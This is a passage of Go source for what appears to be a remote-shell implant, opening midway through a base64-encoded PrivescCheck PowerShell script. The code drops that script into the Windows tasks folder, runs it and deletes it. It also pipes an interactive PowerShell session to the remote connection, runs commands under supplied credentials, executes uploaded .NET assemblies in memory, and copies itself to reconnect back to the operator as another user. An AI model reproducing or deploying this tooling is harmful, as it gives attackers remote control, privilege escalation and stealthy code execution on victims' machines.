Rpb24gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJFJlc3VsdCArPSAifCAkKGlmICgkRmxhZykgeyAnICAgICcgfSBlbHNlIHsgJ0RFU0MnOyAkRmxhZyA9ICRUcnVlIH0pIHwgJCgkXykkKCcgJyooNTMgLSAoW3N0cmluZ10kXykuTGVuZ3RoKSkgfGByYG4iCiAgICB9CiAgICAkUmVzdWx0ICs9ICIrLS0tLS0tKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIgogICAgJFJlc3VsdAp9CgpmdW5jdGlvbiBXcml0ZS1DaGVja1Jlc3VsdCB7CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW29iamVjdF0kQ2hlY2tSZXN1bHQKICAgICkKCiAgICBpZiAoJENoZWNrUmVzdWx0LlJlc3VsdFJhdykgewogICAgICAgICAgICAKICAgICAgICAiWypdIEZvdW5kICQoKFtvYmplY3RbXV0kQ2hlY2tSZXN1bHQuUmVzdWx0UmF3KS5MZW5ndGgpIHJlc3VsdChzKS4iCgogICAgICAgIGlmICgkQ2hlY2tSZXN1bHQuRm9ybWF0IC1lcSAiVGFibGUiKSB7CiAgICAgICAgICAgICRDaGVja1Jlc3VsdC5SZXN1bHRSYXcgfCBGb3JtYXQtVGFibGUgLUF1dG9TaXplCiAgICAgICAgfSBlbHNlaWYgKCRDaGVja1Jlc3VsdC5Gb3JtYXQgLWVxICJMaXN0IikgewogICAgICAgICAgICAkQ2hlY2tSZXN1bHQuUmVzdWx0UmF3IHwgRm9ybWF0LUxpc3QKICAgICAgICB9CiAgICAgICAgCiAgICB9IGVsc2UgewoKICAgICAgICAjIElmIG5vIHJlc3VsdCB3YXMgcmV0dXJuZWQgYnkgdGhlIGNoZWNrLCBwcmludCBhIG1lc3NhZ2UgdGhhdCBzaG93cyB0aGF0IAogICAgICAgICMgdGhlIGhvc3QgaXMgbm90IHZ1bG5lcmFibGUgaWYgaXQncyBhICJ2dWxuIiBjaGVjayBvciwgcHJpbnRlciBhIG1lc3NhZ2UKICAgICAgICAjIHRoYXQgc2hvd3MgdGhhdCBub3RoaW5nIHdhcyBmb3VuZC4KCiAgICAgICAgaWYgKCRDaGVja1Jlc3VsdC5UeXBlIC1lcSAiVnVsbiIpIHsKICAgICAgICAgICAgIlshXSBOb3QgdnVsbmVyYWJsZS4iCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgIlshXSBOb3RoaW5nIGZvdW5kLiIKICAgICAgICB9CiAgICB9CgogICAgImByYG4iCn0KCmZ1bmN0aW9uIFdyaXRlLVR4dFJlcG9ydCB7CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW29iamVjdFtdXSRBbGxSZXN1bHRzCiAgICApCgogICAgJEFsbFJlc3VsdHMgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgIFdyaXRlLUNoZWNrQmFubmVyIC1DaGVjayAkXwogICAgICAgIFdyaXRlLUNoZWNrUmVzdWx0IC1DaGVja1Jlc3VsdCAkXwogICAgfQp9CgpmdW5jdGlvbiBXcml0ZS1Dc3ZSZXBvcnQgewoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtvYmplY3RbXV0kQWxsUmVzdWx0cwogICAgKQogICAgCiAgICAkQWxsUmVzdWx0cyB8IFNvcnQtT2JqZWN0IC1Qcm9wZXJ0eSAiQ2F0ZWdvcnkiIHwgU2VsZWN0LU9iamVjdCAiQ2F0ZWdvcnkiLCJEaXNwbGF5TmFtZSIsIkRlc2NyaXB0aW9uIiwiQ29tcGxpYW5jZSIsIlNldmVyaXR5IiwiUmVzdWx0UmF3U3RyaW5nIiB8IENvbnZlcnRUby1Dc3YgLU5vVHlwZUluZm9ybWF0aW9uCn0KCmZ1bmN0aW9uIFdyaXRlLUh0bWxSZXBvcnQgewoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtvYmplY3RbXV0kQWxsUmVzdWx0cwogICAgKQoKICAgICRKYXZhU2NyaXB0ID0gQCIKdmFyIGNlbGxzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3RkJyk7Cgpmb3IgKHZhciBpPTA7IGk8Y2VsbHMubGVuZ3RoOyBpKyspIHsKICAgIGlmIChjZWxsc1tpXS5pbm5lckhUTUwgPT0gIlRydWUiKSB7CiAgICAgICAgY2VsbHNbaV0uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZjUwNTAnOwogICAgfSBlbHNlIGlmKGNlbGxzW2ldLmlubmVySFRNTCA9PSAiRmFsc2UiKSB7CiAgICAgICAgY2VsbHNbaV0uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyMwMGZmOTknOwogICAgfSBlbHNlIGlmIChjZWxsc1tpXS5pbm5lckhUTUwgPT0gIkxvdyIpIHsKICAgICAgY2VsbHNbaV0uaW5uZXJIVE1MID0gIjxzcGFuIGNsYXNzPVwibGFiZWwgbG93XCI+TG93PC9zcGFuPiIKICAgIH0gZWxzZSBpZiAoY2VsbHNbaV0uaW5uZXJIVE1MID09ICJNZWRpdW0iKSB7CiAgICAgIGNlbGxzW2ldLmlubmVySFRNTCA9ICI8c3BhbiBjbGFzcz1cImxhYmVsIG1lZGl1bVwiPk1lZGl1bTwvc3Bhbj4iCiAgICB9IGVsc2UgaWYgKGNlbGxzW2ldLmlubmVySFRNTCA9PSAiSGlnaCIpIHsKICAgICAgY2VsbHNbaV0uaW5uZXJIVE1MID0gIjxzcGFuIGNsYXNzPVwibGFiZWwgaGlnaFwiPkhpZ2g8L3NwYW4+IgogICAgfSBlbHNlIGlmIChjZWxsc1tpXS5pbm5lckhUTUwgPT0gIkluZm8iKSB7CiAgICAgIGNlbGxzW2ldLmlubmVySFRNTCA9ICI8c3BhbiBjbGFzcz1cImxhYmVsIGluZm9cIj5JbmZvPC9zcGFuPiIKICAgIH0gZWxzZSBpZiAoY2VsbHNbaV0uaW5uZXJIVE1MID09ICJOb25lIikgewogICAgICAgIGNlbGxzW2ldLmlubmVySFRNTCA9ICI8c3BhbiBjbGFzcz1cImxhYmVsIG90aGVyXCI+Tm9uZTwvc3Bhbj4iCiAgICB9IGVsc2UgaWYgKGNlbGxzW2ldLmlubmVySFRNTCA9PSAiT0siKSB7CiAgICAgICAgY2VsbHNbaV0uaW5uZXJIVE1MID0gIjxzcGFuIGNsYXNzPVwibGFiZWwgbG93XCI+T0s8L3NwYW4+IgogICAgfSBlbHNlIGlmIChjZWxsc1tpXS5pbm5lckhUTUwgPT0gIktPIikgewogICAgICAgIGNlbGxzW2ldLmlubmVySFRNTCA9ICI8c3BhbiBjbGFzcz1cImxhYmVsIGhpZ2hcIj5LTzwvc3Bhbj4iCiAgICB9IGVsc2UgaWYgKGNlbGxzW2ldLmlubmVySFRNTCA9PSAiTi9BIikgewogICAgICAgIGNlbGxzW2ldLmlubmVySFRNTCA9ICI8c3BhbiBjbGFzcz1cImxhYmVsIG90aGVyXCI+Ti9BPC9zcGFuPiIKICAgIH0KICAgIAogICAgLy8gSWYgYSBjZWxsIGlzIHRvbyBsYXJnZSwgd2UgbmVlZCB0byBtYWtlIGl0IHNjcm9sbGFibGUuIEJ1dCAndGQnIGVsZW1lbnRzIGFyZSBub3QgCiAgICAvLyBzY3JvbGxhYmxlIHNvLCB3ZSBuZWVkIG1ha2UgaXQgYSAnZGl2JyBmaXJzdCBhbmQgYXBwbHkgdGhlICdzY3JvbGwnIChjLmYuIENTUykgc3R5bGUgdG8gbWFrZQogICAgLy8gaXQgc2Nyb2xsYWJhbGUuCiAgICBpZiAoY2VsbHNbaV0ub2Zmc2V0SGVpZ2h0ID4gMjAwKSB7CiAgICAgICAgY2VsbHNbaV0uaW5uZXJIVE1MID0gIjxkaXYgY2xhc3M9XCJzY3JvbGxcIj4iICsgY2VsbHNbaV0uaW5uZXJIVE1MICsgIjwvZGl2PiI7CiAgICAgICAgY29uc29sZS5sb2coIkNlbGxzIGhlaWdodCBpcyBncmVhdGVyIHRoYW4gMjAwIik7CiAgICB9Cn0KIkAKCiAgICAkQ3NzID0gQCIKYm9keSB7CiAgICBmb250OjEuMmVtIG5vcm1hbCBBcmlhbCxzYW5zLXNlcmlmOwogICAgY29sb3I6IzM0NDk1RTsKICAgIH0KICAgICAgCmgxIHsKICAgIHRleHQtYWxpZ246Y2VudGVyOwogICAgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOwogICAgbGV0dGVyLXNwYWNpbmc6LTJweDsKICAgIGZvbnQtc2l6ZToyLjVlbTsKICAgIG1hcmdpbjoyMHB4IDA7Cn0KICAgICAgCnRhYmxlIHsKICAgIGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTsKICAgIHdpZHRoOjEwMCU7CiAgICBib3JkZXI6MnB4IHNvbGlkICM2Njk5ZmY7Cn0KICAgICAgCnRoIHsKICAgIGNvbG9yOndoaXRlOwogICAgYmFja2dyb3VuZDojNjY5OWZmOwogICAgdGV4dC1hbGlnbjpjZW50ZXI7CiAgICBwYWRkaW5nOjVweCAwOwp9Cgp0ZCB7CiAgICB0ZXh0LWFsaWduOmNlbnRlcjsKICAgIHBhZGRpbmc6NXB4IDVweCA1cHggNXB4Owp9Cgp0Ym9keSB0ZDpudGgtY2hpbGQoMykgewogICAgdGV4dC1hbGlnbjpsZWZ0Owp9CgovKiBSZW5kZXIgb3V0cHV0IHJlc3VsdHMgd2l0aCAncHJlJyBzdHlsZSAqLwp0Ym9keSB0ZDpudGgtY2hpbGQoNikgewogICAgd2hpdGUtc3BhY2U6IHByZTsKICAgIG1hcmdpbjogMWVtIDBweDsKICAgIHBhZGRpbmc6IC4ycmVtIC40cmVtOwogICAgZm9udC1zaXplOiA4Ny41JTsKICAgIGZvbnQtZmFtaWx5OiBTRk1vbm8tUmVndWxhcixNZW5sbyxNb25hY28sQ29uc29sYXMsIkxpYmVyYXRpb24gTW9ubyIsIkNvdXJpZXIgTmV3Iixtb25vc3BhY2U7CiAgICB0ZXh0LWFsaWduOmxlZnQ7Cn0KICAgICAgCnRib2R5IHRyOm50aC1jaGlsZChldmVuKSB7CiAgICBiYWNrZ3JvdW5kOiNFQ0YwRjE7Cn0KICAgICAgCnRib2R5IHRyOmhvdmVyIHsKICAgIGJhY2tncm91bmQ6I0JEQzNDNzsKICAgIGNvbG9yOiNGRkZGRkY7Cn0KCi5zY3JvbGwgewogICAgbWF4LWhlaWdodDogMjAwcHg7CiAgICBvdmVyZmxvdzogYXV0bzsKfQoKLmxhYmVsIHsKICAgIG1hcmdpbjogOHB4OwogICAgcGFkZGluZzogNnB4OwogICAgZGlzcGxheTogYmxvY2s7CiAgICB3aWR0aDogNjBweDsKICAgIGJvcmRlci1yYWRpdXM6IDVweDsKfQoKLmxvdyB7YmFja2dyb3VuZC1jb2xvcjogIzRDQUY1MDt9IC8qIEdyZWVuICovCi5pbmZvIHtiYWNrZ3JvdW5kLWNvbG9yOiAjMjE5NkYzO30gLyogQmx1ZSAqLwoubWVkaXVtIHtiYWNrZ3JvdW5kLWNvbG9yOiAjZmY5ODAwO30gLyogT3JhbmdlICovCi5oaWdoIHtiYWNrZ3JvdW5kLWNvbG9yOiAjZjQ0MzM2O30gLyogUmVkICovCi5vdGhlciB7YmFja2dyb3VuZC1jb2xvcjogI2NjY2NjYzt9IC8qIEdyYXkgKi8KIkAKCiAgICAkSHRtbCA9IEAiCjxodG1sPgo8aGVhZD4KPHN0eWxlPgokKCRDc3MpCjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CkJPRFlfVE9fUkVQTEFDRQo8c2NyaXB0PgokKCRKYXZhU2NyaXB0KQo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+CiJACgogICAgJFRhYmxlSHRtbCA9ICRBbGxSZXN1bHRzIHwgU29ydC1PYmplY3QgLVByb3BlcnR5ICJDYXRlZ29yeSIgfCBDb252ZXJ0VG8tSHRtbCAtUHJvcGVydHkgIkNhdGVnb3J5IiwiRGlzcGxheU5hbWUiLCJEZXNjcmlwdGlvbiIsIkNvbXBsaWFuY2UiLCJTZXZlcml0eSIsIlJlc3VsdFJhd1N0cmluZyIgLUZyYWdtZW50ICAKICAgICRIdG1sID0gJEh0bWwuUmVwbGFjZSgiQk9EWV9UT19SRVBMQUNFIiwgJFRhYmxlSHRtbCkKICAgICRIdG1sCn0KCmZ1bmN0aW9uIFdyaXRlLVByaXZlc2NDaGVja0FzY2lpUmVwb3J0IHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBXcml0ZSBhIHNob3J0IHJlcG9ydCBvbiB0aGUgdGVybWluYWwgaW4gQVNDSUktYXJ0IHVzaW5nICdXcml0ZS1Ib3N0Jy4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIE9uY2UgYWxsIHRoZSBjaGVja3Mgd2VyZSBleGVjdXRlZCwgdGhpcyBmdW5jdGlvbiB3cml0ZXMgYSB0YWJsZSBpbiBBU0NJSS1hcnQgdGhhdCBzdW1tYXJpemVzCiAgICB0aGUgcmVzdWx0cyB3aXRoIGZhbmN5IGNvbG9ycy4gQXMgYSBwZW50ZXN0ZXIgb3IgYSBzeXN0ZW0gYWRtaW5pc3RyYXRvciwgdGhpcyBzaG91bGQgaGVscCB5b3UKICAgIHF1aWNrbHkgc3BvdCB3ZWFrbmVzc2VzIG9uIHRoZSBsb2NhbCBtYWNoaW5lLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gV3JpdGUtUHJpdmVzY0NoZWNrQXNjaWlSZXBvcnQKCiAgICArLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCiAgICB8ICAgICAgICAgICAgICAgICAgICAgICAgIH5+fiBQcml2ZXNjQ2hlY2sgUmVwb3J0IH5+fiAgICAgICAgICAgICAgICAgICAgICAgICB8CiAgICArLS0tLSstLS0tLS0rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCiAgICB8IE9LIHwgTm9uZSB8IEFQUFMgPiBNb2RpZmlhYmxlIEFwcHMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CiAgICB8IE9LIHwgTm9uZSB8IEFQUFMgPiBNb2RpZmlhYmxlIEFwcHMgUnVuIG9uIFN0YXJ0dXAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CiAgICB8IE9LIHwgTm9uZSB8IENPTkZJRyA+IFNDQ00gQ2FjaGUgRm9sZGVyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CiAgICB8IE9LIHwgTm9uZSB8IENPTkZJRyA+IFdTVVMgQ29uZmlndXJhdGlvbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CiAgICB8IE9LIHwgTm9uZSB8IENPTkZJRyA+IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CiAgICB8IE5BIHwgSW5mbyB8IENSRURTID4gQ3JlZGVudGlhbCBNYW5hZ2VyIC0+IDMgcmVzdWx0KHMpICAgICAgICAgICAgICAgICAgICAgICB8CiAgICB8IE5BIHwgSW5mbyB8IENSRURTID4gQ3JlZGVudGlhbCBNYW5hZ2VyICh3ZWIpIC0+IDEgcmVzdWx0KHMpICAgICAgICAgICAgICAgICB8CiAgICB8IE9LIHwgTm9uZSB8IENSRURTID4gVW5hdHRlbmQgRmlsZXMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBDUkVEUyA+IFdpbkxvZ29uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBDUkVEUyA+IFNBTS9TWVNURU0gQmFja3VwIEZpbGVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBDUkVEUyA+IEdQUCBQYXNzd29yZHMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBIQVJERU5JTkcgPiBCaXRMb2NrZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBOQSB8IEluZm8gfCBTRVJWSUNFUyA+IE5vbi1kZWZhdWx0IFNlcnZpY2VzIC0+IDQxIHJlc3VsdChzKSAgICAgICAgICAgICAgICAgfAogICAgfCBOQSB8IEluZm8gfCBTRVJWSUNFUyA+IEhpamFja2FibGUgRExMcyAtPiAyIHJlc3VsdChzKSAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBTRVJWSUNFUyA+IFN5c3RlbSdzICVQQVRIJSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBTRVJWSUNFUyA+IFVucXVvdGVkIFBhdGhzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBTRVJWSUNFUyA+IEJpbmFyeSBQZXJtaXNzaW9ucyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBTRVJWSUNFUyA+IFBlcm1pc3Npb25zIC0gU0NNICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBTRVJWSUNFUyA+IFBlcm1pc3Npb25zIC0gUmVnaXN0cnkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBVUERBVEVTID4gU3lzdGVtIHVwIHRvIGRhdGU/ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBPSyB8IE5vbmUgfCBVU0VSID4gUHJpdmlsZWdlcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgfCBOQSB8IEluZm8gfCBVU0VSID4gRW52aXJvbm1lbnQgVmFyaWFibGVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfAogICAgKy0tLS0rLS0tLS0tKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKwoKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgCiAgICApCgogICAgV3JpdGUtSG9zdCAiKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyIKICAgIFdyaXRlLUhvc3QgInwgICAgICAgICAgICAgICAgICAgICAgICAgfn5+IFByaXZlc2NDaGVjayBSZXBvcnQgfn5+ICAgICAgICAgICAgICAgICAgICAgICAgIHwiCiAgICBXcml0ZS1Ib3N0ICIrLS0tLSstLS0tLS0rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIgoKICAgICRSZXN1bHRBcnJheUxpc3QgfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgQ2F0ZWdvcnkgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgIFdyaXRlLUhvc3QgLU5vTmV3bGluZSAifCAiCiAgICAgICAgaWYgKCRfLlR5cGUgLUxpa2UgInZ1bG4iKSB7CiAgICAgICAgICAgIGlmICgkXy5SZXN1bHRSYXcpIHsKICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgLU5vTmV3bGluZSAtRm9yZWdyb3VuZENvbG9yICJSZWQiICJLTyIKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgLU5vTmV3bGluZSAtRm9yZWdyb3VuZENvbG9yICJHcmVlbiIgIk9LIgogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtSG9zdCAtTm9OZXdsaW5lIC1Gb3JlZ3JvdW5kQ29sb3IgIkRhcmtHcmF5IiAiTkEiCiAgICAgICAgfQogICAgICAgIFdyaXRlLUhvc3QgLU5vTmV3bGluZSAiIHwgIgoKICAgICAgICBpZiAoJF8uU2V2ZXJpdHkgLUxpa2UgIk5vbmUiKSB7CiAgICAgICAgICAgICRTZXZlcml0eUNvbG9yID0gIkRhcmtHcmF5IgogICAgICAgICAgICBXcml0ZS1Ib3N0IC1Ob05ld2xpbmUgLUZvcmVncm91bmRDb2xvciAkU2V2ZXJpdHlDb2xvciAiTm9uZSIKICAgICAgICB9IGVsc2VpZiAoJF8uU2V2ZXJpdHkgLUxpa2UgIkxvdyIpIHsKICAgICAgICAgICAgJFNldmVyaXR5Q29sb3IgPSAiRGFya0dyZWVuIgogICAgICAgICAgICBXcml0ZS1Ib3N0IC1Ob05ld2xpbmUgLUZvcmVncm91bmRDb2xvciAkU2V2ZXJpdHlDb2xvciAiTG93ICIKICAgICAgICB9IGVsc2VpZiAoJF8uU2V2ZXJpdHkgLUxpa2UgIk1lZGl1bSIpIHsKICAgICAgICAgICAgJFNldmVyaXR5Q29sb3IgPSAiRGFya1llbGxvdyIKICAgICAgICAgICAgV3JpdGUtSG9zdCAtTm9OZXdsaW5lIC1Gb3JlZ3JvdW5kQ29sb3IgJFNldmVyaXR5Q29sb3IgIk1lZC4iCiAgICAgICAgfSBlbHNlaWYgKCRfLlNldmVyaXR5IC1MaWtlICJIaWdoIikgewogICAgICAgICAgICAkU2V2ZXJpdHlDb2xvciA9ICJEYXJrUmVkIgogICAgICAgICAgICBXcml0ZS1Ib3N0IC1Ob05ld2xpbmUgLUZvcmVncm91bmRDb2xvciAkU2V2ZXJpdHlDb2xvciAiSGlnaCIKICAgICAgICB9IGVsc2VpZiAoJF8uU2V2ZXJpdHkgLUxpa2UgIkluZm8iKSB7CiAgICAgICAgICAgICRTZXZlcml0eUNvbG9yID0gIkRhcmtCbHVlIgogICAgICAgICAgICBXcml0ZS1Ib3N0IC1Ob05ld2xpbmUgLUZvcmVncm91bmRDb2xvciAkU2V2ZXJpdHlDb2xvciAiSW5mbyIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkU2V2ZXJpdHlDb2xvciA9ICJXaGl0ZSIKICAgICAgICAgICAgV3JpdGUtSG9zdCAtTm9OZXdsaW5lICIgICAgIgogICAgICAgIH0KICAgICAgICBXcml0ZS1Ib3N0IC1Ob05ld2xpbmUgIiB8IgoKICAgICAgICAkTWVzc2FnZSA9ICIkKCRfLkNhdGVnb3J5LlRvVXBwZXIoKSkgPiAkKCRfLkRpc3BsYXlOYW1lKSIKICAgICAgICBpZiAoJF8uUmVzdWx0UmF3KSB7CiAgICAgICAgICAgICRNZXNzYWdlID0gIiQoJE1lc3NhZ2UpIC0+ICQoKFtvYmplY3RbXV0kXy5SZXN1bHRSYXcpLkxlbmd0aCkgcmVzdWx0KHMpIgogICAgICAgIH0KICAgICAgICAkUGFkZGluZyA9ICcgJyAqICQoNjMgLSAkTWVzc2FnZS5MZW5ndGgpCgogICAgICAgIFdyaXRlLUhvc3QgLU5vTmV3bGluZSAiICQoJF8uQ2F0ZWdvcnkuVG9VcHBlcigpKSA+ICQoJF8uRGlzcGxheU5hbWUpIgogICAgICAgIAogICAgICAgIGlmICgkXy5SZXN1bHRSYXcpIHsKICAgICAgICAgICAgV3JpdGUtSG9zdCAtTm9OZXdMaW5lICIgLT4iCiAgICAgICAgICAgIFdyaXRlLUhvc3QgLU5vTmV3TGluZSAtRm9yZWdyb3VuZENvbG9yICRTZXZlcml0eUNvbG9yICIgJCgoW29iamVjdFtdXSRfLlJlc3VsdFJhdykuTGVuZ3RoKSByZXN1bHQocykiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLUhvc3QgIiQoJFBhZGRpbmcpIHwiCiAgICB9CgogICAgV3JpdGUtSG9zdCAiKy0tLS0rLS0tLS0tKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyIKfQojZW5kcmVnaW9uIE1haW4="
					path := "\\windows\\tasks\\temp.ps1"
					decodedScript, _ := base64.StdEncoding.DecodeString(privescCheck)
					ioutil.WriteFile(path, []byte(decodedScript), 0644)
					out, _ := shell.ExecPSOut(fmt.Sprintf(". %s;Invoke-PrivescCheck", path), false)
					c.Write([]byte(out))
					vulns.Check(c)
					os.Remove(path)
					prompt(c)
				case "!runasps":
					if len(argv) != 4 {
						c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
					} else {
						shell.RunAsPS(argv[1], argv[2], argv[3], c)
					}
					prompt(c)
				case "!powershell":
					handled = true
					//log.Println("Entering PowerShell")
					shellCmd, _ = shell.Powershell()
					shellPipeReader, shellPipeWriter = io.Pipe()
					shellCmd.Stdin = c
					shellCmd.Stdout = shellPipeWriter
					shellCmd.Stderr = shellPipeWriter
					go io.Copy(c, shellPipeReader)
					shellCmd.Start()
					shellCmd.Wait()
					//log.Println("Exiting PowerShell (exit)")
					prompt(c)
				case "!rc":
					if len(argv) == 2 {
						rPort := argv[1]
						lIP, lPort := utils.SplitAddress(c.RemoteAddr().String())
						err := rc(lIP, lPort, rPort)
						if err == nil {
							// no error, this shell should restart in a new user context
							return
						}
					} else {
						c.Write([]byte("Usage: !rc <port>\n"))
					}
					prompt(c)
				case "!net":
					// this does not capture output yet, so you have to write to a file
					if len(argv) > 2 {
						assembly := argv[1]
						args := argv[1:]
						bytes, _ := utils.UploadConnectRaw(s)

						// Todo: capture output somehow
						ret, err := clr.ExecuteByteArray("v4", bytes, args)
						if err != nil {
							log.Fatal(err)
						}
						// Todo: remove debug print
						fmt.Printf("Debug: %s returned %d\n", assembly, ret)
						//c.Write([]byte(out))
					} else {
						c.Write([]byte("!net <sample.exe> <arg1> <arg2> ..."))
					}
					prompt(c)
				default:
					shell.Exec(command, c)
					prompt(c)
				}
			}
		} else {
			prompt(c)
		}
	}
}

func rc(lIP string, lPort string, rPort string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", rPort))
	if err != nil {
		return err
	}
	path := shell.CopySelf()
	cmd := fmt.Sprintf("c:\\windows\\system32\\cmd.exe /c %s %s %s\r\n", path, lIP, lPort)
	conn.Write([]byte(cmd))
	time.Sleep(5000 * time.Millisecond)
	conn.Close()
	return nil
}
